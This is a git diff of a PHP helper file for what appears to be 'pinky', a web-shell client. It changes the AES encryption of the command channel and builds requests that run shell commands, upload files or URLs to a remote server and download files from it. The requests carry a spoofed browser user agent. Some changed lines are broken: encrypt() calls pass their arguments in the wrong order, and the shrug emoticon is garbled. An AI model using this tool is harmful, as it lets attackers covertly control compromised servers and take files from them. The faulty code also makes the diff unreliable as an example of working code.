@@ -1,71 +1,125 @@
 <?php
 
-function build_request($cmd, $path, $key, $iv)
+/**
+ * Encrypts a string
+ *
+ * @param string $plaintext  Raw string to be encrypted
+ * @param string $secret_key  Encryption key, also required for decryption
+ * @param mixed  $method OpenSSL or mcrypt (legacy)
+ *
+ * @return string Raw data encrypted with a key
+ */
+function encrypt($plaintext, $secret_key, $method = 'openssql')
 {
-    $data     = array(
+    $cipher = "AES-256-CBC";
+    $key = hash_pbkdf2('sha256', $secret_key, '', 10000, 0, true);
+
+    $ivlen = openssl_cipher_iv_length($cipher);
+    $iv = openssl_random_pseudo_bytes($ivlen);
+    $ciphertext_raw = openssl_encrypt($plaintext, $cipher, $key, $options=OPENSSL_RAW_DATA, $iv);
+    $hmac = hash_hmac('sha256', $ciphertext_raw, $key, $as_binary=true);
+    $ciphertext = base64_encode( $iv.$hmac.$ciphertext_raw );
+
+    return $ciphertext;
+}
+
+/**
+ * Decrypts an encrypted string
+ *
+ * @param string $ciphertext  Encrypted text to be decrypted
+ * @param string $secret_key  Encryption key, also required for decryption
+ * @param mixed  $method OpenSSL or mcrypt (legacy)
+ *
+ * @return string Raw data encrypted with a key
+ */
+function decrypt($ciphertext, $secret_key, $method = 'openssql')
+{
+    $cipher="AES-256-CBC";
+    $key = hash_pbkdf2('sha256', $secret_key, '', 10000, 0, true);
+
+    $c = base64_decode($ciphertext);
+    $ivlen = openssl_cipher_iv_length($cipher);
+    $iv = substr($c, 0, $ivlen);
+    $hmac = substr($c, $ivlen, $sha2len=32);
+    $ciphertext_raw = substr($c, $ivlen+$sha2len);
+    $original_plaintext = openssl_decrypt($ciphertext_raw, $cipher, $key, $options=OPENSSL_RAW_DATA, $iv);
+    $calcmac = hash_hmac('sha256', $ciphertext_raw, $key, $as_binary=true);
+
+    return hash_equals($hmac, $calcmac) ? $original_plaintext : null;
+}
+
+
+function make_request($cmd, $path, $key)
+{
+    $data = array(
         'p' => base64_encode($path)
     );
     $position = strpos($cmd, 'pinky:');
     if ($position === false) {
-        $data['c'] = encrypt_decrypt('encrypt', base64_encode($cmd), $key, $iv);
-    } else {
-        $cmd    = str_replace('pinky:', '', $cmd);
-        $input  = explode(' ', $cmd);
+        $data['c'] = encrypt(base64_encode($cmd) , $key);
+    }
+    else {
+        $cmd = str_replace('pinky:', '', $cmd);
+        $input = explode(' ', $cmd);
         $action = $input[0];
         array_shift($input);
         if ($action == 'upload') {
-            $data['f']      = array(); // files
+            $data['f'] = array(); // files
             $data['f']['u'] = array(); // urls
             $data['f']['b'] = array(); // binaries
-            foreach ($input as $entry) {
+            foreach($input as $entry) {
                 if (filter_var($entry, FILTER_VALIDATE_URL)) {
                     $parsed = parse_url($entry);
-                    $name   = base64_encode(basename($parsed['path']));
-                    $url    = base64_encode($entry);
-                    $array  = array(
-                        'n' => encrypt_decrypt('encrypt', $name, $key, $iv),
-                        'p' => encrypt_decrypt('encrypt', $url, $key, $iv)
+                    $name = base64_encode(basename($parsed['path']));
+                    $url = base64_encode($entry);
+                    $array = array(
+                        'n' => encrypt('encrypt', $name, $key) ,
+                        'p' => encrypt('encrypt', $url, $key)
                     );
                     array_push($data['f']['u'], $array);
-                } else {
+                }
+                else {
                     $file = file_to_base64($entry);
                     if (!is_null($file)) {
-                        $name  = base64_encode(basename(realpath($entry)));
+                        $name = base64_encode(basename(realpath($entry)));
                         $array = array(
-                            'n' => encrypt_decrypt('encrypt', $name, $key, $iv),
-                            'p' => encrypt_decrypt('encrypt', $file, $key, $iv)
+                            'n' => encrypt('encrypt', $name, $key) ,
+                            'p' => encrypt('encrypt', $file, $key)
                         );
                         array_push($data['f']['b'], $array);
-                    } else {
+                    }
+                    else {
                         echo " [!] ERROR: {$entry} doesn't exists or isn't readable.\n";
                     }
                 }
             }
-        } elseif ($action == 'download') {
-            $data['f']      = array();
+        }
+        elseif ($action == 'download') {
+            $data['f'] = array();
             $data['f']['d'] = array(); // files to download
-            foreach ($input as $entry) {
+            foreach($input as $entry) {
                 $name = base64_encode($entry);
-                array_push($data['f']['d'], encrypt_decrypt('encrypt', $name, $key, $iv));
+                array_push($data['f']['d'], encrypt('encrypt', $name, $key));
             }
         }
     }
+
     return $data;
 }
 
-function send_request($url, $data, $login, $password, $proxy = array(), $cookies = null)
+function send_request($url, $data, $login, $password, $proxy = array() , $cookies = null)
 {
     $url_components = parse_url($url);
-    $b              = 'Mozilla/5.0 (Windows NT 6.1; rv:52.0) Gecko/20100101 Firefox/52.0';
-    $query          = http_build_query($data);
-    $headers        = array(
+    $b = 'Mozilla/5.0 (Windows NT 6.1; rv:52.0) Gecko/20100101 Firefox/52.0';
+    $query = http_build_query($data);
+    $headers = array(
         'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
         'Connection: Keep-Alive',
         'Accept-Language: en-US,en;q=0.5',
         'Accept-Encoding: gzip, deflate, br',
         'Upgrade-Insecure-Requests: 1',
         'Cache-Control: max-age=0',
-        'Authorization: Basic ' . base64_encode("{$login}:{$password}"),
+        'Authorization: Basic ' . base64_encode("{$login}:{$password}") ,
         'Content-Type: application/x-www-form-urlencoded',
         'Host: ' . $url_components['host']
     );
@@ -102,37 +156,21 @@ function send_request($url, $data, $login, $password, $proxy = array(), $cookies
 
     $result = curl_exec($ch);
     if ($result === false) {
-        echo "\n\t" . curl_error($ch) . " ¯\_(ツ)_/¯\n\n";
+        echo "\n\t" . curl_error($ch) . " Â¯\_(ãƒ„)_/Â¯\n\n";
     }
 
     $info = curl_getinfo($ch);
     curl_close($ch);
-
     return array(
         'status' => $info['http_code'],
         'content' => $result
     );
 }
 
-function encrypt_decrypt($action, $string, $secret_key, $secret_iv)
-{
-    $output         = false;
-    $encrypt_method = "AES-256-CBC";
-    $key            = hash('sha256', $secret_key);
-    $iv             = substr(hash('sha256', $secret_iv), 0, 16);
-    if ($action == 'encrypt') {
-        $output = openssl_encrypt($string, $encrypt_method, $key, 0, $iv);
-        $output = base64_encode($output);
-    } else if ($action == 'decrypt') {
-        $output = openssl_decrypt(base64_decode($string), $encrypt_method, $key, 0, $iv);
-    }
-
-    return $output;
-}
 
 function is_json_valid($config)
 {
-    if (is_null($config) || !isset($config['key']) || !isset($config['iv']) || !isset($config['url']) || !isset($config['login'])) {
+    if (is_null($config) || !isset($config['key']) || !isset($config['url']) || !isset($config['login'])) {
         return false;
     }
 
@@ -148,6 +186,7 @@ function file_to_base64($file)
     if (file_exists($file) && is_readable($file)) {
         return base64_encode(file_get_contents($file));
     }
+
     return null;
 }
 
@@ -156,19 +195,19 @@ function base64_to_file($base64_string, $path, $output_file)
     if (!is_writable($path)) {
         return null;
     }
+
     $complete_path = $path . '/' . $output_file;
-    $handle        = fopen($complete_path, "wb");
+    $handle = fopen($complete_path, "wb");
     fwrite($handle, base64_decode($base64_string));
     fclose($handle);
     return $output_file;
 }
 
-function print_help($version)
+function print_welcome($version)
 {
-    $author  = "David Tavarez";
+    $author = "David Tavarez";
     $twitter = "@davidtavarez";
-    $web     = "https://davidtavarez.github.io/";
-
+    $web = "https://davidtavarez.github.io/";
     $banner = <<<EOT
         _       _          
   _ __ (_)_ __ | | ___   _ 
@@ -186,12 +225,11 @@ EOT;
     echo " \e[91m+ Author\e[0m: {$author}\n";
     echo " \e[91m+ Twitter\e[0m: {$twitter}\n";
     echo " \e[91m+ Website\e[0m: {$web}\n\n";
-
     $warning = <<<EOT
  +[\e[91mWARNING\e[0m\e[93m]------------------------------------------+
  | DEVELOPERS ASSUME NO LIABILITY AND ARE NOT        |
  | RESPONSIBLE FOR ANY MISUSE OR DAMAGE CAUSED BY    |
- | THIS PROGRAM  ¯\_(ツ)_/¯                          |
+ | THIS PROGRAM  Â¯\_(ãƒ„)_/Â¯                          |
  +---------------------------------------------------+
  
 EOT;
@@ -199,5 +237,29 @@ EOT;
     echo $warning;
     echo "\e[0m";
     echo "\n";
+}
 
+/**
+ * Generate a random string, using a cryptographically secure
+ * pseudorandom number generator (random_int)
+ *
+ * For PHP 7, random_int is a PHP core function
+ * For PHP 5.x, depends on https://github.com/paragonie/random_compat
+ *
+ * @param int $length How many characters do we want?
+ * @param string $keyspace A string of all possible characters
+ *                         to select from
+ * @return string
+ * @throws Exception
+ */
+function random_str($length, $keyspace = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ') {
+    $str = '';
+    $max = mb_strlen($keyspace, '8bit') - 1;
+    if ($max < 1) {
+        throw new Exception('$keyspace must be at least two characters long');
+    }
+    for ($i = 0; $i < $length; ++$i) {
+        $str .= $keyspace[random_int(0, $max)];
+    }
+    return $str;
 }
